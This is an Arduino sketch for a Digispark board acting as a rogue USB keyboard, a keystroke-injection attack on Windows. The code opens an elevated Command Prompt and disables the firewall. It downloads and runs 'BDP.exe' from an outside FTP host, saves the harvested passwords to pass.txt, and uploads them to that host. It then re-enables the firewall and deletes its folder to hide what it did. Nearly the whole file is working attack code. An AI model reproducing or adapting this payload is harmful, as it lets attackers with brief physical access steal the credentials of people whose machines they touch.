#include "DigiKeyboard.h"
#define KEY_TAB 43

void setup() {
  // open Command Prompt as an admin
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print("cmd");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //make directory for script
DigiKeyboard.delay(2000);
DigiKeyboard.print("mkdir C:\\t3mp0r4ry");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);

  //disable firewall
DigiKeyboard.print("netsh advfirewall set allprofiles state off");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(2000);

  //get file through FTP
DigiKeyboard.print("cd C:\\t3mp0r4ry");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("ftp");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("open ftp.drivehq.com");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1200);
DigiKeyboard.print("username");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1200);
DigiKeyboard.print("password");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("get BDP.exe");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(8000);
DigiKeyboard.print("close");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("quit");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("BDP.exe");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(2000);

  //retrieve passwords
DigiKeyboard.sendKeyStroke(KEY_A, MOD_CONTROL_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_S, MOD_CONTROL_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.print("pass");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_D, MOD_ALT_LEFT);
DigiKeyboard.delay(3000);
DigiKeyboard.print("C:\\t3mp0r4ry");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_TAB);
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_TAB);
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
DigiKeyboard.print("del BDP.exe");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);

  //send file through FTP
DigiKeyboard.print("ftp");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("open ftp.drivehq.com");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("username");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("password");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("send pass.txt");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(6000);
DigiKeyboard.print("close");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
DigiKeyboard.print("quit");
DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //wrap up clean needless files
DigiKeyboard.delay(200);
DigiKeyboard.print("netsh advfirewall set allprofiles state on");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(2000);
DigiKeyboard.print("cd c:/");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
DigiKeyboard.print("rmdir C:\\t3mp0r4ry /s");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("y");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);

  //exit
DigiKeyboard.print("exit");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop()
{

}